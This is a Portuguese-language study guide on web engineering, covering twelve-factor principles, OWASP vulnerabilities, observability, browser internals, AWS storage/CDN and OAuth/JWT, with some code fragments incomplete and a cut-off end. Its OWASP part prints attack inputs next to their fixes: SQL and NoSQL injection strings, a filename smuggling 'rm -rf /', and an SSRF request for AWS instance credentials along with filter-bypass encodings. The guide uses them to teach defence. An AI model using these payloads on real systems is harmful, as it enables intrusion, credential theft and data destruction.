App ├── DATABASE_URL=postgres://localhost/app ← banco local (dev) ├── DATABASE_URL=postgres://rds.aws.com/app ← banco gerenciado (prod) ├── REDIS_URL=redis://localhost:6379 ← redis local └── REDIS_URL=redis://elasticache.aws/... ← ElastiCache (prod) A app é a mesma. Só a config muda.

Onde o modelo falha:

Quando o backing service tem APIs radicalmente diferentes (ex: trocar PostgreSQL por DynamoDB). Plugabilidade total é ideal mas raramente realista — o código sempre vaza detalhes do serviço.

V. Build / Release / Run — Três Estágios Imutáveis

CÓDIGO │ ▼ BUILD — transforma código em artefato executável │ (npm run build, tsc, docker build) │ Resultado: imagem Docker, bundle JS, binário │ ▼ RELEASE — artefato + config do ambiente │ Imutável! Toda release tem ID único (git hash, timestamp) │ Nunca altere uma release — crie uma nova │ ▼ RUN — executa a release no ambiente (docker run, kubectl apply, pm2 start)
🚨 Violação crítica: Fazer SSH no servidor de produção e editar código diretamente. Isso combina Build + Run em uma etapa sem Release — impossível rollback, impossível reproduzir.

Por que imutabilidade importa: Se a release 42 tem problema, você faz rollback para a release 41 — sem recompilar, sem risco de diferença. É exatamente o que feature flags e Kubernetes deployments fazem.

VI. Processes — Stateless e Share-Nothing

O que é: Processos da app não devem guardar estado entre requests. Cada request deve poder ser atendida por qualquer instância. Estado persistente vai para backing services (banco, Redis).

// ❌ VIOLAÇÃO — estado em memória do processo
let sessaoUsuario = {}; // se o request for pro processo B, não está aqui!

app.post('/login', (req, res) => {
  sessaoUsuario[req.body.userId] = { loggedIn: true }; // bug em múltiplas instâncias
});

// ✅ Estado externo (Redis, banco)
app.post('/login', async (req, res) => {
  await redis.set(`session:${req.body.userId}`, JSON.stringify({ loggedIn: true }));
  res.send({ ok: true });
});
⚠️ Sticky sessions (sempre rotear o mesmo usuário para o mesmo processo) é uma solução paliativa que quebra esse fator. Dificulta escala e failover.

VII. Port Binding — Auto-suficiência

O que é: A app exporta seus serviços via uma porta. Ela não depende de um servidor web externo (Apache, IIS) instalado no sistema — ela é o servidor.

// ✅ A app é o servidor — escuta na porta via env
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Rodando na :${PORT}`));

// Em produção: PORT=8080 node server.js
// O load balancer fala com a porta — a app não precisa saber de mais nada

Por que importa: Permite que a mesma app rode como serviço web, worker, ou CLI apenas mudando o comando de entrada — sem precisar de infraestrutura diferente.

VIII. Concurrency — Escale via Processos

O que é: Escale horizontalmente adicionando mais processos (instâncias), não verticalmente com máquinas maiores. Diferentes tipos de trabalho têm diferentes tipos de processo.

Process Model: web: 3 instâncias → atende requests HTTP worker: 5 instâncias → processa jobs da fila clock: 1 instância → dispara cron jobs Pico de tráfego? Suba web para 10 instâncias. Fila acumulando? Suba worker para 15 instâncias. Sem mudar código, sem downtime.

Onde o modelo falha:

Node.js single-threaded não escala CPU-bound trabalho bem via múltiplos processos Node (overhead de IPC). Aí entram Worker Threads ou delegar para serviços especializados.

IX. Disposability — Rápido de Subir, Gracioso de Morrer

Fast startup: processo pronto em segundos (não minutos). Permite escala rápida e re-deploy sem downtime.
Graceful shutdown: ao receber SIGTERM, termina os requests em andamento e fecha conexões antes de morrer.

// Graceful shutdown — CRÍTICO em produção
process.on('SIGTERM', async () => {
  console.log('SIGTERM recebido. Encerrando...');

  // Para de aceitar novos requests
  server.close(async () => {
    // Aguarda requests em andamento terminarem
    await db.disconnect();
    await redis.disconnect();
    console.log('Encerrado com sucesso');
    process.exit(0);
  });

  // Força saída se demorar mais de 30s (evitar hang)
  setTimeout(() => process.exit(1), 30000);
});
💡 Em Kubernetes: o preStop hook + terminationGracePeriodSeconds garantem que o pod recebe SIGTERM e tem tempo para finalizar antes do SIGKILL.

XI. Logs — Stream de Eventos

O que é: A app não gerencia seus logs. Ela escreve tudo em stdout como stream de eventos. O ambiente de execução (Docker, Kubernetes, Heroku) captura e encaminha para onde quiser (CloudWatch, Datadog, S3).

// ✅ Correto — escreve em stdout/stderr
console.log(JSON.stringify({ level: 'info', msg: 'request recebido', path: '/api' }));
console.error(JSON.stringify({ level: 'error', msg: 'falha no banco', err: err.message }));

// ❌ VIOLAÇÃO — a app gerencia arquivos de log
const logFile = fs.createWriteStream('./logs/app.log', { flags: 'a' });
// Problemas: rotação de logs, permissões, disco cheio, não funciona em múltiplos pods
💡 Formato JSON estruturado em logs é padrão de mercado — permite filtrar, agregar e alertar em ferramentas como Datadog, Splunk, CloudWatch Logs Insights.

XII. Admin Processes — One-Off Tasks

O que é: Tarefas administrativas (migrations, scripts de limpeza, shell interativo) devem rodar no mesmo ambiente e codebase que a app — não em scripts separados ou máquinas diferentes.

docker run --env-file .env myapp:v2.1 npm run migrate

# ✅ Shell de administração na mesma codebase
kubectl exec -it pod/myapp-xyz -- node scripts/limpar-dados-antigos.js

# ❌ VIOLAÇÃO — script de migration em servidor separado
# com versão diferente do código, config diferente, pode ter comportamento diferente

Onde o modelo falha:

Em serverless (AWS Lambda), rodar one-off tasks é complicado — você precisa de um invoke manual ou criar uma função Lambda específica para admin, o que viola a ideia de "mesma codebase".

A01 — Broken Access Control

Causa raiz: A aplicação não verifica se o usuário autenticado tem autorização para acessar aquele recurso específico.

Analogia: Você entrou no condomínio (autenticação), mas deveria poder acessar só seu apartamento. Broken Access Control é quando você consegue abrir a porta do vizinho porque o sistema só verifica que você tem a chave do condomínio, não que aquela porta é sua.

IDOR — Insecure Direct Object Reference:

// ❌ VULNERÁVEL — usa ID do usuário direto na URL sem checar se pertence a ele
app.get('/api/pedidos/:id', async (req, res) => {
  const pedido = await Pedido.findById(req.params.id);
  res.json(pedido); // qualquer usuário logado vê qualquer pedido!
});

// ✅ CORRETO — verifica ownership
app.get('/api/pedidos/:id', async (req, res) => {
  const pedido = await Pedido.findOne({
    _id: req.params.id,
    userId: req.user.id  // ← garante que pertence ao usuário logado
  });
  if (!pedido) return res.status(403).json({ error: 'Acesso negado' });
  res.json(pedido);
});

A02 — Cryptographic Failures

Causa raiz: Dados sensíveis expostos por falta de criptografia, uso de algoritmos fracos, ou implementação incorreta.

Hashing vs Criptografia — diferença fundamental:

Hashing (one-way)
  • Não dá pra reverter
  • Mesmo input → mesmo output sempre
  • Uso: senhas, verificação de integridade
  • ✅ bcrypt, argon2, scrypt
  • ❌ MD5, SHA-1 (para senhas!)
Criptografia (two-way)
  • Pode ser decriptada com a chave
  • Uso: dados que precisam ser lidos depois
  • Dados em repouso: AES-256-GCM
  • Dados em trânsito: TLS 1.3
  • ❌ DES, RC4, AES-ECB
// ❌ VULNERÁVEL — senha em texto puro ou MD5
const senha = md5(req.body.password); // MD5 é reversível via rainbow tables!

// ✅ bcrypt com salt (salt é automático)
import bcrypt from 'bcrypt';
const SALT_ROUNDS = 12; // quanto maior, mais lento (e mais seguro)
const hash = await bcrypt.hash(req.body.password, SALT_ROUNDS);
// Verificar:
const valido = await bcrypt.compare(req.body.password, hash);

// Dados em repouso — criptografar campos sensíveis no banco
// Ex: CPF, cartão de crédito, tokens de API de terceiros
⚠️ Armadilha: HTTPS protege dados em trânsito mas não em repouso. Se o banco vazar (SQL injection, backup exposto), os dados precisam estar criptografados/hasheados lá também.

A03 — Injection

Causa raiz: Dados do usuário são interpretados como código/comando pelo interpretador (SQL, shell, LDAP, etc.).

SQL Injection — além do "use prepared statements":

// ❌ VULNERÁVEL
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// Input malicioso: ' OR '1'='1' --
// Query vira: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Retorna TODOS os usuários!

// ✅ Prepared statements / parameterized queries
const { rows } = await pg.query(
  'SELECT * FROM users WHERE email = $1',
  [req.body.email] // input é dado, nunca código
);

// ✅ ORM com query builder seguro
const user = await User.findOne({ where: { email: req.body.email } });

NoSQL Injection (MongoDB):

// ❌ VULNERÁVEL — operador MongoDB injetado
app.post('/login', async (req, res) => {
  const user = await User.findOne({
    email: req.body.email,    // { "$gt": "" } → retorna todos!
    password: req.body.password
  });
});
// Ataque: { "email": { "$gt": "" }, "password": { "$gt": "" } }

// ✅ Sanitizar input — rejeitar objetos onde string é esperada
import { sanitize } from 'mongo-sanitize'; // remove $ e . do input
const user = await User.findOne({
  email: sanitize(req.body.email),
  password: sanitize(req.body.password)
});

OS Command Injection:

// ❌ VULNERÁVEL
exec(`convert ${req.query.filename} output.pdf`);
// Ataque: filename = "foto.jpg; rm -rf /"

// ✅ Use array de args (sem shell) ou libs específicas
execFile('convert', [req.query.filename, 'output.pdf']);
// execFile não usa shell — sem interpolação, sem injeção

Causa raiz: Falhas de design que nenhum controle de implementação vai corrigir. O problema está na arquitetura, não no código.

Threat Modeling — pensar em ataques antes de escrever código:

A05 — Security Misconfiguration

Causa raiz: Configurações padrão inseguras, recursos desnecessários habilitados, headers de segurança ausentes.

Headers HTTP de segurança essenciais:

// Com Helmet.js (Node/Express)
import helmet from 'helmet';
app.use(helmet()); // ativa vários headers de uma vez

// O que cada header faz:
// Content-Security-Policy: bloqueia XSS definindo de onde scripts podem vir
// X-Frame-Options: DENY — impede clickjacking (site em iframe malicioso)
// X-Content-Type-Options: nosniff — impede MIME sniffing
// Strict-Transport-Security: força HTTPS por X tempo
// Referrer-Policy: controla quanta info vai no header Referer
// Permissions-Policy: desativa features (câmera, microfone) que não usa

// CSP exemplo:
res.setHeader('Content-Security-Policy',
  "default-src 'self'; " +
  "script-src 'self' 'nonce-abc123'; " +  // nonce único por request
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data: https://cdn.exemplo.com; " +
  "connect-src 'self' https://api.exemplo.com;"
);

Defaults perigosos comuns:

  • Stack traces em produção — expõem estrutura interna do código
  • Directory listing no nginx/Apache — mostra arquivos do servidor

  • Portas de debug abertas — --inspect do Node em produção

A10 — SSRF — Server-Side Request Forgery

Causa raiz: A aplicação faz requests HTTP para URLs controladas pelo usuário sem validar o destino. O atacante usa o servidor como proxy para acessar recursos internos.

Analogia: Você pede pra um funcionário buscar um arquivo. Em vez de passar o nome do arquivo, você passa o endereço da sala do cofre. O funcionário, sem saber, vai buscar o cofre pra você. 
// ❌ VULNERÁVEL — faz request para URL do usuário
app.post('/preview', async (req, res) => {
  const response = await fetch(req.body.url); // SSRF!
  res.send(await response.text());
});

// Ataque: url = "http://169.254.169.254/latest/meta-data/iam/credentials"
// (metadata service da AWS — expõe credenciais da instância!)

// ✅ Validação rigorosa
import { URL } from 'url';
function urlSegura(urlStr) {
  const url = new URL(urlStr);
  // Bloquear IPs privados/reservados
  const blocklist = ['169.254.', '10.', '172.16.', '192.168.', '127.', 'localhost'];
  if (blocklist.some(b => url.hostname.startsWith(b))) {
    throw new Error('URL não permitida');
  }
  // Permitir só HTTPS e domínios específicos
  if (url.protocol !== 'https:') throw new Error('Só HTTPS');
  return url;
}

Bypass de filtros — como atacantes contornam:

  • http://2130706433/ — representação decimal de 127.0.0.1
  • http://0x7f000001/ — representação hexadecimal
  • DNS rebinding — domínio público que resolve para IP privado
  • Redirecionamentos — URL pública redireciona para IP interno

Mitigação real: Além de validar a URL, resolva o DNS e verifique o IP resultante. Melhor ainda: use um proxy dedicado para requests de saída com allowlist de destinos.

⏱️ Latência — Percentis vs Média

Por que a média mente: Se 99% dos requests são 10ms e 1% são 10s, a média é ~110ms — parece ok, mas 1 em cada 100 usuários espera 10 segundos.

Exemplo: 10 requests com tempos (ms): 10, 12, 11, 13, 10, 11, 12, 10, 9, 5000 Média: 509ms ← enganosa! p50: 11ms ← usuário mediano p95: 5000ms ← 1 em 20 usuários p99: 5000ms ← 1 em 100 usuários Monitor: p99 > SLO? → alertar. Não a média.

SLI / SLO / SLA — a hierarquia:

SLIService Level Indicator — a métrica medida% de requests com latência < 200ms
SLOService Level Objective — a meta internaSLI >= 99.5% (meta de engenharia)

💡 Latência de erros vs sucesso: Meça separadamente. Se erros retornam rápido (fail-fast) mas requests de sucesso são lentos, a latência "boa" mascara o problema.

📊 Tráfego — Mais que RPS

  • RPS (Requests per Second) — métrica primária para HTTP
  • Transações por segundo — para sistemas de pagamento/e-commerce
  • Mensagens por segundo — para sistemas de fila/event-driven
  • Bytes transferidos — para sistemas de streaming/storage

Anomaly Detection:

Tráfego 50% acima do normal pode ser sucesso de uma campanha ou início de um ataque DDoS. Contexto importa — combine com taxa de erros e latência para distinguir.

Error Budget:

SLO: 99.9% de disponibilidade
→ Error budget: 0.1% = ~43 minutos de downtime por mês

Consumiu o error budget?
→ Congela novos features até o próximo período
→ Foco total em confiabilidade
→ É a ferramenta que alinha dev e ops em torno de confiabilidade

🔥 Saturação — Onde o Sistema Vai Quebrar

  • CPU: >80% sustentado → degradação de latência. >95% → requests começam a falhar
  • Memória: perto de 100% → OOM killer mata processos, latência de GC explode
  • I/O: disk wait >10ms sustentado → banco de dados começa a enfileirar
  • Filas: fila crescendo em vez de diminuindo → consumidores insuficientes

Saturação é preditivo — você pode agir antes de quebrar. Latência e erros são reativos — você age depois que quebrou.

Após Spectre (2018), Chrome ativou Site Isolation: cada site roda em um processo separado, não só cada aba. Isso impede que um site malicioso leia memória de outro processo (vetor do Spectre).

Consequência: SharedArrayBuffer requer headers Cross-Origin-Opener-Policy: same-origin e Cross-Origin-Embedder-Policy: require-corp para funcionar, porque requer contexto "isolado".

🧭 Navegação: DNS → TCP → TLS → HTTP Browsers

🔍 O Ciclo Completo de uma Navegação

Usuário digita: https://meusite.com/produtos FASE 1: DNS Resolution Browser cache → OS cache → DNS resolver local → DNS recursivo → DNS autoritativo → retorna IP: 93.184.216.34 Tempo: 1ms (cache) a 100ms+ (sem cache) FASE 2: TCP Handshake (3-way) Client → SYN → Server Client ← SYN-ACK ← Server Client → ACK → Server Tempo: 1 RTT (Round-Trip Time) FASE 3: TLS Handshake (TLS 1.3) Client → ClientHello (suites, key share) → Server Client ← ServerHello + Certificate ← Server Client ← EncryptedExtensions + Finished ← Server Client → Finished (conexão estabelecida) → Server Tempo: 1 RTT (TLS 1.3) vs 2 RTT (TLS 1.2) (0-RTT possível em conexões resumidas — TLS 1.3) FASE 4: HTTP Request/Response Client → GET /produtos HTTP/2 → Server Client ← 200 OK + HTML (streaming) ← Server FASE 5: Service Worker (se registrado) SW intercepta o fetch antes de ir pra rede Pode responder do cache, modificar request, etc.

Service Worker como Interceptor:

// sw.js — Service Worker registrado na página
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(cached => {
      if (cached) return cached; // serve do cache local (funciona offline!)

      return fetch(event.request).then(response => {
        // Guarda no cache para próxima vez
        const cacheClone = response.clone();
        caches.open('v1').then(cache => cache.put(event.request, cacheClone));
        return response;
      });
    })

});

📝 Parsing HTML Browsers

🔤 Tokenização e Tree Construction

HTML Bytes → Tokenização → Tokens → Tree Construction → DOM Tokenização: "<div class='hero'>Olá</div>" ↓ [StartTag: div, class=hero] [Character: Olá] [EndTag: div] Tree Construction: Tokens alimentam o "Tree Builder" que constrói o DOM progressivamente. document └── html ├── head └── body └── div.hero └── "Olá"

Parser-Blocking Resources — o inimigo do TTFB:

HTML Parser encontra: <link rel="stylesheet" href="styles.css"> → PARA tudo. Baixa e processa CSS. Depois continua. (CSS bloqueia parsing E render — CSSOM necessário para renderizar) <script src="app.js"> → PARA tudo. Baixa e executa JS. Depois continua. (JS pode modificar o DOM, então o parser precisa pausar) <script defer src="app.js"> → NÃO bloqueia. Baixa em paralelo. Executa APÓS o HTML parsear. <script async src="app.js"> → NÃO bloqueia download. Executa ASSIM QUE baixar (pode ser no meio do parse!). <script type="module" src="app.js"> → Como defer: baixa em paralelo, executa após HTML. Suporta import/export.

Preload Scanner — o herói oculto:

O browser tem um segundo "leitor" (preload scanner) que varre o HTML enquanto o parser principal está bloqueado por CSS/JS. Ele adianta o download de recursos que vê no HTML. Por isso <img src> no HTML é encontrado mais cedo que background-image em CSS.

🔒 Segurança do Browser Browsers

🏠 Same-Origin Policy (SOP)

O que é: Scripts de uma origem (protocolo + domínio + porta) não podem ler conteúdo de outra origem. É a base da segurança web.

Origem: https://meusite.com:443 https://meusite.com/api ✅ Mesma origem https://meusite.com:8080/api ❌ Porta diferente http://meusite.com/api ❌ Protocolo diferente https://api.meusite.com/api ❌ Subdomínio diferente https://outrosite.com/api ❌ Domínio diferente
💡 O que SOP protege: JavaScript de site malicioso não pode ler sua conta bancária via fetch — a resposta seria bloqueada. MAS a SOP não impede o REQUEST de ser feito (veja CSRF).

🌐 CORS em Profundidade

CORS (Cross-Origin Resource Sharing) é o mecanismo que permite que a SOP seja relaxada de forma controlada pelo servidor.

🔁 Navegação Tradicional (sem framework)

Analogia: Cada clique num link é como pedir uma refeição do zero. O garçom (browser) vai até a cozinha (servidor), espera tudo ser preparado, traz o prato completo, você come e joga o prato fora. No próximo clique, recomeça tudo.
Usuário clica em <a href="/sobre"> 1. BROWSER └─ Descarta a página atual (DOM, JS heap, listeners — tudo) └─ Gera novo request HTTP GET /sobre 2. REDE └─ DNS (cache quente → ~0ms, frio → ~60-100ms) └─ TCP Handshake (1 RTT) — ou reusa conexão keep-alive └─ TLS (0–1 RTT se já estabelecido via session resumption) └─ HTTP Request → servidor recebe 3. SERVIDOR └─ Roteamento (ex: Express/NestJS): qual handler responde /sobre? └─ Handler executa: busca dados no banco, chama serviços └─ Template engine (ex: Handlebars, Jinja) gera HTML completo └─ Resposta: 200 OK + HTML como string 4. BROWSER (página nova) └─ Parser HTML constrói DOM do zero └─ Descobre <link> CSS → CSSOM └─ Descobre <script> → baixa, executa └─ Render tree → Layout → Paint → Composite └─ Página visível (FCP)

Custo:

  • Todo o JS é re-baixado/re-executado (a menos que esteja em cache)
  • Flash branco entre páginas (DOM descartado)
  • Estado do app perdido — a cada navegação, começa do zero
  • Vantagem: sem JS = funciona. Cada URL é uma página real — SEO trivial.

⚡ Navegação SPA — History API (sem framework)

Uma SPA intercepta o clique antes de o browser fazer o request. Troca só o conteúdo, mantém o shell da aplicação.

Usuário clica em <a href="/sobre"> 1. JS intercepta o evento antes do browser agir └─ event.preventDefault() — cancela a navegação real └─ history.pushState({}, '', '/sobre') — muda a URL sem request 2. O browser: └─ Atualiza a barra de endereços para /sobre └─ Adiciona entrada no histórico (botão Voltar funciona) └─ NÃO faz request HTTP nenhum └─ NÃO descarta o DOM 3. JS do app (router manual): └─ Lê window.location.pathname → '/sobre' └─ Decide qual componente/HTML renderizar └─ fetch('/api/sobre') — busca só os DADOS (JSON), não HTML └─ Manipula o DOM: document.getElementById('app').innerHTML = ... 4. BROWSER (mesma página, DOM atualizado) └─ Recalc Style → Layout → Paint → Composite └─ Só a parte que mudou é re-renderizada
// Roteador SPA mínimo (vanilla JS)

  const link = e.target.closest('a[href]');
  if (!link || link.origin !== location.origin) return;

  e.preventDefault();
  history.pushState({}, '', link.href);
  renderPage();
});

async function renderPage() {
  const path = location.pathname;
  const routes = { '/': HomeComponent, '/sobre': SobreComponent };
  const Component = routes[path] ?? NotFoundComponent;

  const data = await fetch(`/api${path}`).then(r => r.json());
  document.getElementById('app').replaceChildren(Component(data));
}

🔧 Custom Elements — Ciclo de Vida Completo

Analogia: Custom Elements são como criar uma nova peça de LEGO. Você define a forma, cor, e como ela se encaixa. Depois de definida, qualquer pessoa pode usar <meu-botao> no HTML como se fosse um elemento nativo. 
class MeuBotao extends HTMLElement {
  // Quais atributos observar (para attributeChangedCallback)
  static get observedAttributes() {
    return ['disabled', 'label', 'variant'];
  }

  constructor() {
    super(); // SEMPRE chamar super() primeiro
    // Inicializar estado interno aqui
    // Não acessa DOM aqui (ainda não está conectado)
    this._clickCount = 0;
  }

  // Elemento inserido no DOM (ou movido)
  connectedCallback() {
    this.render();
    this.addEventListener('click', this._handleClick);
    // Boa hora para buscar dados, iniciar timers
  }

  // Elemento removido do DOM
  disconnectedCallback() {
    this.removeEventListener('click', this._handleClick);
    // Limpar subscriptions, timers, observers
    // Equivalente ao useEffect cleanup do React
  }

  // Atributo observado mudou
  attributeChangedCallback(name, oldValue, newValue) {
    if (oldValue === newValue) return;
    this.render(); // re-render quando atributo muda
  }

  // Movido para outro document (ex: importNode)
  adoptedCallback() { }

  _handleClick = () => {
    this._clickCount++;
    this.dispatchEvent(new CustomEvent('meu-click', {
      detail: { count: this._clickCount },
      bubbles: true,    // sobe pelo DOM
      composed: true    // atravessa Shadow DOM boundary
    }));
  };

  render() {
    this.innerHTML = `
      <button ${this.hasAttribute('disabled') ? 'disabled' : ''}>
        ${this.getAttribute('label') || 'Clique'}
      </button>
    `;
  }
}

🏛️ Composição: Build-time vs Run-time

Build-time Composition
  • MFEs são pacotes npm — importados no build
  • Output: um bundle unificado
  • ✅ Simples, sem overhead de runtime
  • ✅ Melhor performance (tree-shaking entre MFEs)

Run-time Composition
  • MFEs são carregados em runtime via URL

  • ✅ Deploy verdadeiramente independente
  • ✅ Times autônomos — deploy sem coordenação
  • ❌ Performance: mais bundles, mais requests
  • ❌ Compatibilidade entre versões de MFEs em runtime

🔗 Presigned URLs

URLs temporárias que delegam permissão para um cliente fazer uma operação específica no S3 sem precisar de credenciais AWS.

import { S3Client, PutObjectCommand, GetObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';

const s3 = new S3Client({ region: 'us-east-1' });

// Upload direto do browser para S3 (sem passar pelo servidor)
const uploadUrl = await getSignedUrl(
  s3,
  new PutObjectCommand({
    Bucket: 'meu-bucket',
    Key: `uploads/${userId}/${fileName}`,
    ContentType: 'image/webp',
  }),
  { expiresIn: 300 } // URL válida por 5 minutos
);

// Cliente usa a URL diretamente — sem expor credenciais AWS
await fetch(uploadUrl, {
  method: 'PUT',
  body: arquivo,
  headers: { 'Content-Type': 'image/webp' }
});

⚡ Object Lambda

Transforma objetos S3 on-the-fly com uma Lambda function. Sem armazenar versões processadas — gera sob demanda.

// GET https://meu-object-lambda.s3-object-lambda.amazonaws.com/foto.jpg?w=200

exports.handler = async (event) => {
  const { getObjectContext, userRequest } = event;
  const width = new URL(userRequest.url).searchParams.get('w');

  // Busca o objeto original
  const original = await fetch(getObjectContext.inputS3Url);
  const buffer = Buffer.from(await original.arrayBuffer());

  // Processa (redimensiona)
  const resized = await sharp(buffer).resize(parseInt(width)).toBuffer();

  // Envia o resultado de volta
  await s3.writeGetObjectResponse({
    RequestRoute: getObjectContext.outputRoute,
    RequestToken: getObjectContext.outputToken,
    Body: resized,
    ContentType: 'image/webp',
  });
};

🔑 Cache Key — O que Determina um Hit

Cache key é o "identificador" de um objeto no cache. Por padrão: só o caminho da URL. Você pode adicionar query strings, headers e cookies à cache key via Cache Policy.

// Problema: query string não está na cache key (default)
// GET /api/produtos?categoria=eletronicos
// GET /api/produtos?categoria=roupas
// CloudFront trata como o MESMO objeto (mesma cache key: /api/produtos)
// Usuário que pediu eletronicos pode receber roupas do cache!

// Solução: Cache Policy incluindo query strings
// Na Console AWS ou via Terraform:
CachePolicy:
  QueryStringsConfig:
    QueryStringBehavior: Whitelist
    QueryStrings: [categoria, pagina, ordenar]
  // Só adiciona essas query strings à cache key
  // Outras query strings são ignoradas (menos variações de cache = mais hits)

Origin Request Policy vs Cache Policy:

PolicyO que controlaImpacto
Cache PolicyO que compõe a cache keyAfeta o cache hit ratio — menos variáveis = mais hits
Origin Request PolicyO que é enviado à origin nos missesPode incluir mais info sem afetar o cache
💡 Separação importante: Você pode encaminhar um header à origin (Origin Request Policy) sem inclui-lo na cache key (Cache Policy). Ex: encaminhar Accept-Language à origin mas não usar como cache key para evitar fragmentação excessiva.

📊 Modo Count vs Block

Modo Count
  • Regra avaliada mas não bloqueia
  • Incrementa contador de métricas
  • Logs a regra que "teria bloqueado"
  • ✅ Use para testar nova regra em produção
  • ✅ Zero risco de falso positivo bloqueando usuários legítimos
  • Monitore as métricas por 1-2 semanas antes de mudar para Block
Modo Block
  • Request bloqueada — retorna 403
  • Ative após validar no modo Count
  • Configure Custom Response para 403
  • ⚠️ Falsos positivos bloqueiam usuários reais
  • Use exclusion rules para URLs que devem bypassar

🪪 Autenticação vs Autorização Base

A confusão entre esses dois conceitos é a causa raiz de inúmeras vulnerabilidades. São coisas completamente diferentes.

🔍 A Diferença que Importa

Analogia: Você chega a um show. O segurança pede seu documento — isso é autenticação ("você é quem diz ser?"). Depois confere se seu ingresso é VIP ou pista — isso é autorização ("você pode entrar nessa área?"). São duas perguntas diferentes, feitas por pessoas diferentes, em momentos diferentes.

🧱 Conceitos Base Fundamentos

🎫 Token vs Sessão

Sessão (Stateful)
  • Servidor cria e guarda a sessão (banco/redis)
  • Cliente recebe só um Session ID (cookie)
  • Cada request: servidor busca a sessão pelo ID
  • ✅ Revogação instantânea (delete do banco)
  • ✅ Dados sensíveis ficam no servidor
  • ❌ Servidor precisa guardar estado → dificulta escala horizontal
  • ❌ Banco/redis vira ponto de falha
Token (Stateless)
  • Servidor gera um token assinado (JWT)
  • Cliente guarda e envia em cada request
  • Cada request: servidor valida a assinatura
  • ✅ Sem estado no servidor → escala horizontal fácil
  • ✅ Funciona cross-domain naturalmente
  • ❌ Revogação complexa (token válido até expirar)
  • ❌ Dados no token ficam no cliente

⚖️ Stateless vs Stateful

STATEFUL (Sessão): Request 1: POST /login → Server cria session_id=abc123 no Redis Request 2: GET /perfil + Cookie: session_id=abc123 Server → Redis.get("abc123") → { userId: 42, role: admin } Server processa o request Sem Redis = sem autenticação! STATELESS (JWT): Request 1: POST /login → Server gera JWT assinado → retorna ao cliente Request 2: GET /perfil + Authorization: Bearer eyJhbG... Server → valida assinatura do JWT (sem banco!) Server decodifica payload → { sub: 42, role: admin } Server processa o request

🔐 PKCE — Proof Key for Code Exchange Obrigatório

PKCE (pronuncia-se "pixy") é uma extensão OBRIGATÓRIA para SPAs e apps mobile. Resolve o problema de interceptação do authorization code quando não há client_secret.

🤔 Por que PKCE existe?

SPAs não podem guardar um client_secret — qualquer um pode abrir o DevTools e ler. Sem o secret, como o Authorization Server garante que quem está trocando o code é o mesmo app que iniciou o fluxo?

Analogia: Você coloca um bilhete num cofre (code_challenge), vai buscar algo, e quando volta prova que é você mostrando a chave do cofre (code_verifier). Quem interceptou o bilhete no caminho não tem a chave.

🔧 Como Funciona Passo a Passo

Gerar code_verifier — string aleatória criptograficamente segura (43-128 chars, charset: [A-Z a-z 0-9 - . _ ~])
Gerar code_challenge — SHA256(code_verifier), codificado em base64url (sem padding =)
Enviar code_challenge no authorization request — o Authorization Server guarda
Receber o code — no callback (igual ao fluxo normal)
Enviar code_verifier na troca do token — o AS faz SHA256(verifier) e compara com o challenge guardado 
// Implementação completa em JavaScript (SPA)

// 1. Gerar code_verifier
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64urlEncode(array);
}

// 2. Gerar code_challenge = BASE64URL(SHA256(verifier))
async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const digest = await crypto.subtle.digest('SHA-256', data);
  return base64urlEncode(new Uint8Array(digest));
}

function base64urlEncode(buffer) {
  return btoa(String.fromCharCode(...buffer))
    .replace(/\+/g, '-')   // + → -
    .replace(/\//g, '_')   // / → _
    .replace(/=/g, '');    // remove padding
}

// 3. Iniciar login
async function login() {
  const verifier = generateCodeVerifier();
  const challenge = await generateCodeChallenge(verifier);

  // Guardar verifier para usar no callback
  sessionStorage.setItem('pkce_verifier', verifier);

  // Redirecionar com o challenge
  const params = new URLSearchParams({
    response_type: 'code',
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    scope: 'openid email profile',
    code_challenge: challenge,
    code_challenge_method: 'S256',   // SHA-256
    state: generateState(),
  });
  window.location.href = `${AUTH_SERVER}/authorize?${params}`;
}

// 4. No callback — trocar code por token
async function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const verifier = sessionStorage.getItem('pkce_verifier');

  const response = await fetch(`${AUTH_SERVER}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      client_id: CLIENT_ID,
      redirect_uri: REDIRECT_URI,
      code,
      code_verifier: verifier,  // ← prova que somos nós
    })
  });
  const tokens = await response.json();
  // Usar os tokens...
}

🎟️ JWT — Nível Especialista JWT

JSON Web Token. Não é criptografia — é assinatura. Qualquer um pode ler o payload. A segurança está na verificação da assinatura.

🔬 Estrutura Detalhada

JWT = BASE64URL(Header) . BASE64URL(Payload) . Signature eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9 . eyJzdWIiOiI0MiIsIm5hbWUiOiJFZHUiLCJleHAiOjE3MTIwMDAwMDB9 . 🔑 HMAC vs RSA — Como a Assinatura Funciona

HMAC (HS256)
  • Simétrico — mesma chave para assinar e verificar
  • Rápido e simples
  • ✅ Bom quando Authorization Server e Resource Server são o mesmo sistema
  • ❌ Ruim em microservices — todos precisam da chave secreta → risco de vazamento
RSA (RS256) / ECDSA (ES256)
  • Assimétrico — chave privada para assinar, pública para verificar
  • Auth Server guarda a privada, distribui a pública (JWKS endpoint)
  • ✅ Qualquer serviço verifica sem ter a chave secreta
  • ✅ Padrão para sistemas distribuídos e OAuth
  • ❌ Mais lento que HMAC
// Resource Server verifica JWT sem depender do Auth Server (RS256)
import jwt from 'jsonwebtoken';
import jwksClient from 'jwks-rsa';

const client = jwksClient({
  jwksUri: 'https://auth.exemplo.com/.well-known/jwks.json' // chaves públicas
});

function getKey(header, callback) {
  client.getSigningKey(header.kid, (err, key) => {
    callback(err, key?.getPublicKey());
  });
}

function verificarToken(token) {
  return new Promise((resolve, reject) => {
    jwt.verify(token, getKey, {
      algorithms: ['RS256'],           // ← forçar algoritmo explicitamente!
      audience: 'https://api.ex.com', // ← validar audience
      issuer: 'https://auth.ex.com',  // ← validar issuer
    }, (err, decoded) => {
